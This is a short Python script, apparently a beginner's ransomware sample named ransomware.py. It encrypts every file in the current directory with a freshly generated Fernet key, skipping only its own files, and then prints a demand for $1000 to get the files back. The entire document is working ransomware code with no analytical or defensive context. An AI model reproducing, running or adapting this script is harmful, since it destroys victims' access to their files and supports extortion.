import os
from cryptography.fernet import Fernet

#find files
Files = []

for file in os.listdir():
  if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
    continue
  if os.path.isfile(file):
    Files.append(file)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
  thekey.write(key)

for file in Files:
  with open(file, "rb") as thefile:
    content = thefile.read()
  content_encryted = Fernet(key).encrypt(content)
  with open(file, "wb") as thefile:
    thefile.write(content_encryted)

print("Files encrypted successfully")
print(
    "All of your file  have been encryped !! payme $1000 to get your files back"
)
